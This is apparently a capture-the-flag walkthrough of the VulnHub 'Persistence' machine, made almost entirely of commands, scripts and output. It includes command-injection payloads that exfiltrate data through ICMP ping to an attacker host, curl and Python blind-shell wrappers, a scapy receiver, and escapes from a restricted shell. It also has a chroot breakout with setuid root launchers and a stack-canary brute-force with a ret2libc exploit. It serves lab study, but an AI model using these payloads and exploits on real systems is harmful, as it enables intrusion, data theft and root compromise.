<https://connect.ed-diamond.com/GNU-Linux-Magazine/GLMFHS-090/Scapy-le-couteau-suisse-Python-pour-le-reseau>
    
<https://swappage.github.io/blog/2014/10/06/vulnhub-competition-persistence/>

<https://leonjza.github.io/blog/2014/09/18/from-persistence/>

<https://swappage.github.io/images/2014-10-06/persistence.pdf>
    
<http://devloop.users.sourceforge.net/index.php?article106/solution-du-ctf-persistence>
    
<https://g0blin.co.uk/persistence-vulnhub-writeup/#what-a-beautiful-shell>
    
<https://book.hacktricks.xyz/linux-unix/privilege-escalation/escaping-from-limited-bash>
    
<https://beta.hackndo.com/technique-du-canari-bypass/>

<https://filippo.io/escaping-a-chroot-jail-slash-1/>

<http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html>
    
<https://book.hacktricks.xyz/exfiltration>
    

Keys : ping exfiltration,  escaping from limited bash (ftp, nano), escaping a chroot jail, buffer overflow, canary protection


# Scan

## nmap

    └─$ sudo nmap -sT -sV -p- -A -T5 192.168.56.8
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-23 11:21 CET
    Nmap scan report for 192.168.56.8
    Host is up (0.00041s latency).
    Not shown: 65533 filtered tcp ports (no-response)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 5.3 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 f6:c7:fe:24:09:fa:dc:db:ea:7e:33:6a:f5:36:58:35 (DSA)
    |_  2048 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54 (RSA)
    80/tcp open  http    nginx 1.4.7
    |_http-title: The Persistence of Memory - Salvador Dali
    |_http-server-header: nginx/1.4.7
    MAC Address: 08:00:27:99:21:6B (Oracle VirtualBox virtual NIC)
    Warning: OSScan results may be unreliable because we could not find at least 1 o
    Device type: general purpose
    Running: Linux 2.6.X|3.X
    OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
    OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
    Network Distance: 1 hop

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.41 ms 192.168.56.8

    OS and Service detection performed. Please report any incorrect results at https
    Nmap done: 1 IP address (1 host up) scanned in 60.12 seconds

## nikto

```console
└─$ nikto -h http://192.168.56.8
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.8
+ Target Hostname:    192.168.56.8
+ Target Port:        80
+ Start Time:         2021-07-22 18:42:11 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.4.7
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-powered-by header: PHP/5.3.3
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /debug.php: Possible debug directory/program found.
+ 7921 requests: 6 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-07-22 18:42:35 (GMT2) (24 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```



# Exploit

## Data exfiltration with PING



```console
localhost; echo "test" > /tmp/test; if [ $? -eq 0 ]; then ping -c 1 192.168.56.1; fi
;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.1; done
;id | base64 | xxd -ps -c 16 | while read i; do ping -c1 -s32 -p $i 192.168.56.1; done
;id |  xxd -ps -c 16 | while read i; do ping -c1 -s32 -p $i 192.168.56.1; done

; id |xxd -p -c 4 | while read line; do ping -c 1 -p $line 192.168.56.1; done
;./sysadmin-tool --activate-service| xxd -p -c 4 | while read line; do ping -p $line -c 1 -q 192.168.56.1; done

```

## Monitoring

```console

sudo tcpdump host 192.168.56.8 -i vboxnet0 and icmp

```

## Script to exploit


### Sender

#### curl

```bash
#!/bin/bash

HOST=192.168.56.8
SHELL=debug.php
printf "$ "
while read cmd
do
    if [[ "$cmd" ##  "exit" ]]; then
        break
    fi
    curl -s --data-urlencode "addr=;$cmd| xxd -p -c 4 | while read line; do ping -p \$line -c 1 -q 192.168.56.1; done" http://$HOST/$SHELL | sed '1,$d'
    printf "$ "
done < "/proc/${$}/fd/0"

```


#### python


```python

# browser.py
#!/usr/bin/python3
from requests import post
import sys

url='http://192.168.56.8/debug.php'
attacker = '192.168.56.1'

while True:
    try:
        sys.stdout.write('# ')
        command = sys.stdin.readline().strip()
        if (command ==  "exit"):
            break
        payload = "; {} | xxd -p -c 4 | while read line; do ping -c 1 -p $line {}; done".format(command,attacker)
        r = post(url, data={"addr":payload})
    except KeyboardInterrupt:
        break
```



### Receiver

```py

# recieve-icmp.py
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
    if pkt.haslayer(ICMP):
        if pkt[ICMP].type == 0:
            data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
            print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="vboxnet0", prn=process_packet)


```

## Exploit

```bash
python3 browser.py
# ls -al
# ./sysadmin-tool
# ./sysadmin-tool --activate-service


sudo python3 recieve-icmp.py
Usage: sysadmin-tool --activate-service
Service started...
Use avida:dollars to access.


```

## Post exploit

```console

ssh avida@192.168.56.8 # dollars

```
### Escape jail

```console
    # with nano
    nano -s /bin/bash
    /bin/bash
    ^T

    # with ftp
    ftp
    !
    /bin/bash

    # export evironement
    $ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/home/avida/usr/bin
    $ export SHELL=/bin/bash


```


### Open ports

    bash-4.1$ netstat -tuln
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address               Foreign Address             State
    tcp        0      0 0.0.0.0:3333                0.0.0.0:*                   LISTEN
    tcp        0      0 127.0.0.1:9000              0.0.0.0:*                   LISTEN
    tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN
    tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN
    tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN
    tcp        0      0 :::22                       :::*                        LISTEN
    tcp        0      0 ::1:25                      :::*                        LISTEN
    udp        0      0 0.0.0.0:68                  0.0.0.0:*

# Exploit sysadmin-tool


## Code source


```c
//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
// sysadmin-tool.c

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

// ------------------------ Functions -------------------------

// Address range: 0x8048514 - 0x8048615
int main(int argc, char ** argv) {
    if (argc != 2) {
        // 0x8048523
        puts("Usage: sysadmin-tool --activate-service");
        // 0x8048613
        return 0;
    }
    int32_t str = *(int32_t *)((int32_t)argv + 4); // 0x804853f
    if (strncmp((char *)str, "--activate-service", 18) != 0) {
        // 0x804855d
        puts("Usage: sysadmin-tool --activate-service");
        // 0x8048613
        return 0;
    }
    // 0x8048573
    setreuid(0, 0);
    mkdir("breakout", 448);
    chroot("breakout");
    for (int32_t i = 0; i < 100; i++) {
        // 0x80485b1
        chdir("..");
    }
    // 0x80485c9
    chroot(".");
    system("/bin/sed -i 's/^#//' /etc/sysconfig/iptables");
    system("/sbin/iptables-restore < /etc/sysconfig/iptables");
    puts("Service started...");
    puts("Use avida:dollars to access.");
    // 0x8048613
    return rmdir("/nginx/usr/share/nginx/html/breakout");
}

// --------------- Dynamically Linked Functions ---------------

// int chdir(const char * path);
// int chroot(const char * path);
// int mkdir(const char * path, __mode_t mode);
// int puts(const char * s);
// int rmdir(const char * path);
// int setreuid(__uid_t ruid, __uid_t euid);
// int strncmp(const char * s1, const char * s2, size_t n);
// int system(const char * command);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected functions: 1
```


## Exploit chroot


### Prepare evironement for chroot

```bash

bash-4.1$ ldd /usr/sbin/chroot
        linux-gate.so.1 =>  (0xb7fff000)
        libc.so.6 => /lib/libc.so.6 (0xb7e62000)
        /lib/ld-linux.so.2 (0x00110000)

bash-4.1$ cd /tmp
bash-4.1$ mkdir /tmp/chroot
bash-4.1$ cd /tmp/chroot
bash-4.1$ mkdir -p $(python -c "print 'a/'*100")
bash-4.1$ mkdir bin
bash-4.1$ cp -a /bin/bash bin/bash
bash-4.1$ cp -a /bin/sh bin/sh
bash-4.1$ cp -al /lib lib
bash-4.1$ cd $(python -c "print 'a/'*100")

```

###  Test path

```c
// $ cd $(python -c "print 'a/'*100")
// cat test.c 
// gcc test.c -o test

#include <stdio.h>
#include <stdlib.h>

int main() {
    int i;
    for (i = 0; i < 100; i++) {
        printf("%d\n", i);
        chdir(".."); // /tmp/chroot
    }
    system("/bin/pwd");
}

```
### Create a launcher

```c

// cat launcher.c 
// gcc launcher.c -o /tmp/chroot/bin/launcher

#include <stdio.h>
#include <stdlib.h>
int main() {
        setuid(0);
        setgid(0);
        system("/bin/bash");
}

```

### Create a "fake" sed

```c
// cat sed.c
// gcc sed.c -o /tmp/chroot/bin/sed

#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
        setuid(0);
        setgid(0);
        chown("/bin/launcher", 0, 0);
        chmod("/bin/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
}

```
### Exploit chroot and get root

```console
bash-4.1$ cd $(python -c "print 'a/'*100")

bash-4.1$ ls -al /tmp/chroot/bin/launcher 
-rwxrwxr-x. 1 avida avida 4864 Jul 23 11:17 /tmp/chroot/bin/launcher

bash-4.1$ /nginx/usr/share/nginx/html/sysadmin-tool --activate-service
bash-4.1$ ls -al /tmp/chroot/bin/launcher 
-rwsrwxrwx. 1 root root 4864 Jul 23 11:17 /tmp/chroot/bin/launcher

bash-4.1$ /tmp/chroot/bin/launcher
bash-4.1# id
uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

```


## Exploit worp

### worp file

    bash-4.1$ cat /proc/sys/kernel/randomize_va_space 
    0

    bash-4.1$ ls -al /usr/local/bin/wopr
    -rwxr-xr-x. 1 root root 7878 Apr 28  2014 /usr/local/bin/wopr

    bash-4.1$ ./checksec.sh --file /usr/local/bin/wopr 
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /usr/local/bin/wopr

### port forward

```console
└─$ ssh -N -f -L 3333:127.0.0.1:3333 avida@192.168.56.8
```
### 
```python
import socket
import time
import struct

def p(x):
  return struct.pack('<L', x)


target = "127.0.0.1"
port = 3333
junk = "A"*30
canary = ""
for byte in xrange(4):
  for canary_byte in xrange(256):
    hex_byte = chr(canary_byte)

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.settimeout(10)
    client.connect((target, port))
    # [+] hello, my name is sploitable
    reponse = client.recv(33)
    # print (reponse.decode())
    # [+] would you like to play a game?
    reponse = client.recv(35)
    # print (reponse.decode())
    # >
    reponse = client.recv(1)
    # print (reponse.decode())

    client.send(junk+canary+hex_byte)

    # [+] yeah, I don't think so
    time.sleep(0.1)
    reponse = client.recv(27)
    # print (reponse.decode())
    # [+] bye!
    reponse = client.recv(9)
    if (b"bye!" in reponse):
      canary += hex_byte
      print (str(canary_byte) + " " + hex(canary_byte))
      client.close()
      break
    client.close()

rop = p(0xdeadbeef) #EBP
rop += p(0x16c210)  # system
rop += p(0x15f070)  # exit
rop += p(0x8048c60) # /tmp/log

payload = junk + canary + rop

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.settimeout(10)
client.connect((target, port))
# [+] hello, my name is sploitable
reponse = client.recv(33)
# print (reponse.decode())
# [+] would you like to play a game?
reponse = client.recv(35)
# print (reponse.decode())
# >
reponse = client.recv(1)
# print (reponse.decode())

client.send(payload)

# [+] yeah, I don't think so
time.sleep(0.1)
reponse = client.recv(27)
# print (reponse.decode())
# [+] bye!
reponse = client.recv(9)
client.close()

```

```c
// cat launcher.c
#include <stdio.h>
#include <stdlib.h>
int main() {
        setuid(0);
        setgid(0);
        system("/bin/bash");
}

```
```c

#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/unistd.h>

int main() {
        setuid(0);
        setgid(0);
        chown("/tmp/launcher", 0, 0);
        chmod("/tmp/launcher", S_ISUID|S_IRWXU|S_IRWXG|S_IRWXO);
}


```



```console
bash-4.1$ gcc launcher.c -o launcher

bash-4.1$ cat /tmp/log 
chown root.root /tmp/launcher
chmod 4755 /tmp/launcher
bash-4.1$ chmod  +x /tmp/log 
```

```console

└─$ python2 exploit-worp.py

```
```console
bash-4.1$ ls -al /tmp/launcher
-rwsr-xr-x. 1 root root 4864 Jul 23 11:45 /tmp/launcher
bash-4.1$ /tmp/launcher 
bash-4.1# id
uid=0(root) gid=0(root) groups=0(root),500(avida) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

```bash
# cat /etc/sysconfig/iptables
*filter
:INPUT DROP [0:0]
:FORWARD DROP [0:0]
:OUTPUT DROP [0:0]
-A INPUT -p icmp -j ACCEPT
-A OUTPUT -p icmp -j ACCEPT
-A INPUT -i lo -j ACCEPT
-A OUTPUT -o lo -j ACCEPT

-A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 22 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 22 -j ACCEPT

-A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT
-A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 80 -j ACCEPT
COMMIT
```

```c
//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
// worp.c

#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

// ------------------------ Structures ------------------------

struct sockaddr {
    int32_t e0;
    char e1[14];
};

// ------------------- Function Prototypes --------------------

int32_t get_reply(int32_t * a1, int32_t a2, int32_t fd);

// --------------------- Global Variables ---------------------

int32_t g1;

// ------------------------ Functions -------------------------

// Address range: 0x8048774 - 0x80487de
int32_t get_reply(int32_t * a1, int32_t a2, int32_t fd) {
    int32_t v1 = __readgsdword(20); // 0x804878c
    int32_t v2; // bp-38, 0x8048774
    memcpy(&v2, a1, a2);
    write(fd, (int32_t *)"[+] yeah, I don't think so\n", 27);
    int32_t result = 0; // 0x80487d5
    if (v1 != __readgsdword(20)) {
        // 0x80487d7
        __stack_chk_fail();
        result = &g1;
    }
    // 0x80487dc
    return result;
}

// Address range: 0x80487de - 0x8048b41
int main(int argc, char ** argv) {
    // 0x80487de
    __readgsdword(20);
    int32_t option_value = 1; // bp-564, 0x804880d
    int32_t addr_len = 16; // bp-568, 0x8048817
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x8048838
    if (sock_fd < 0) {
        // 0x804884c
        perror("socket");
        exit(*__errno_location());
        // UNREACHABLE
    }
    // 0x8048867
    if (setsockopt(sock_fd, SO_DEBUG, 2, &option_value, 4) < 0) {
        // 0x804889b
        perror("setsockopt");
        exit(*__errno_location());
        // UNREACHABLE
    }
    int16_t addr = 2; // bp-552, 0x80488b6
    htons(3333);
    int32_t v1; // bp-544, 0x80487de
    memset(&v1, 0, 8);
    if (bind(sock_fd, (struct sockaddr *)&addr, 16) < 0) {
        // 0x8048921
        perror("bind");
        exit(*__errno_location());
        // UNREACHABLE
    }
    // 0x804893c
    puts("[+] bind complete");
    if (listen(sock_fd, 20) < 0) {
        // 0x8048962
        perror("listen");
        exit(*__errno_location());
        // UNREACHABLE
    }
    // 0x804897d
    setenv("TMPLOG", "/tmp/log", 1);
    puts("[+] waiting for connections");
    puts("[+] logging queries to $TMPLOG");
    int32_t addr2; // bp-536, 0x80487de
    int32_t accepted_sock_fd = accept(sock_fd, (struct sockaddr *)&addr2, &addr_len); // 0x80489ce
    if (accepted_sock_fd < 0) {
        // 0x80489e2
        perror("accept");
        exit(*__errno_location());
        // UNREACHABLE
    }
    int32_t fd = accepted_sock_fd;
    puts("[+] got a connection");
    while (fork() != 0) {
        // 0x8048b0e
        close(fd);
        int32_t v2 = waitpid(-1, NULL, WNOHANG); // 0x8048b33
        while (v2 >= 0 ##  (v2 != 0)) {
            // 0x8048b1c
            v2 = waitpid(-1, NULL, WNOHANG);
        }
        int32_t accepted_sock_fd2 = accept(sock_fd, (struct sockaddr *)&addr2, &addr_len); // 0x80489ce
        if (accepted_sock_fd2 < 0) {
            // 0x80489e2
            perror("accept");
            exit(*__errno_location());
            // UNREACHABLE
        }
        fd = accepted_sock_fd2;
        puts("[+] got a connection");
    }
    // 0x8048a16
    write(fd, (int32_t *)"[+] hello, my name is sploitable\n", 33);
    write(fd, (int32_t *)"[+] would you like to play a game?\n", 35);
    write(fd, (int32_t *)"> ", 2);
    int32_t buf; // bp-520, 0x80487de
    memset(&buf, 0, 512);
    int32_t v3 = read(fd, &buf, 512); // 0x8048aa9
    get_reply(&buf, v3, fd);
    write(fd, (int32_t *)"[+] bye!\n", 9);
    close(fd);
    exit(0);
    // UNREACHABLE
}

// --------------- Dynamically Linked Functions ---------------

// int * __errno_location(void);
// void __stack_chk_fail(void);
// int accept(int fd, __SOCKADDR_ARG addr, socklen_t * restrict addr_len);
// int bind(int fd, __CONST_SOCKADDR_ARG addr, socklen_t len);
// int close(int fd);
// void exit(int status);
// __pid_t fork(void);
// uint16_t htons(uint16_t hostshort);
// int listen(int fd, int n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// void * memset(void * s, int c, size_t n);
// void perror(const char * s);
// int puts(const char * s);
// ssize_t read(int fd, void * buf, size_t nbytes);
// int setenv(const char * name, const char * value, int replace);
// int setsockopt(int fd, int level, int optname, const void * optval, socklen_t optlen);
// int socket(int domain, int type, int protocol);
// __pid_t waitpid(__pid_t pid, int * stat_loc, int options);
// ssize_t write(int fd, const void * buf, size_t n);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: gcc (4.6.3)
// Detected functions: 2

```


# Box's configuration

## iptables

    bash-4.1# iptables -L
    Chain INPUT (policy DROP)
    target     prot opt source               destination         
    ACCEPT     icmp --  anywhere             anywhere            
    ACCEPT     all  --  anywhere             anywhere            
    ACCEPT     tcp  --  anywhere             anywhere            state NEW,ESTABLISHED tcp dpt:ssh 
    ACCEPT     tcp  --  anywhere             anywhere            state NEW,ESTABLISHED tcp dpt:http 

    Chain FORWARD (policy DROP)
    target     prot opt source               destination         

    Chain OUTPUT (policy DROP)
    target     prot opt source               destination         
    ACCEPT     icmp --  anywhere             anywhere            
    ACCEPT     all  --  anywhere             anywhere            
    ACCEPT     tcp  --  anywhere             anywhere            state ESTABLISHED tcp spt:ssh 
    ACCEPT     tcp  --  anywhere             anywhere            state ESTABLISHED tcp spt:http 

    bash-4.1# cat /etc/sysconfig/iptables
    *filter
    :INPUT DROP [0:0]
    :FORWARD DROP [0:0]
    :OUTPUT DROP [0:0]
    -A INPUT -p icmp -j ACCEPT
    -A OUTPUT -p icmp -j ACCEPT
    -A INPUT -i lo -j ACCEPT
    -A OUTPUT -o lo -j ACCEPT

    -A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 22 -j ACCEPT
    -A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 22 -j ACCEPT

    -A INPUT -m state --state NEW,ESTABLISHED -m tcp -p tcp --dport 80 -j ACCEPT
    -A OUTPUT -m state --state ESTABLISHED -m tcp -p tcp --sport 80 -j ACCEPT
    COMMIT

## File debug.php

```php
<?php 
// /nginx/usr/share/nginx/html/debug.php
if (isset($_POST["addr"]))
{
    exec("/bin/ping -c 4 ".$_POST["addr"]);
}
?>
```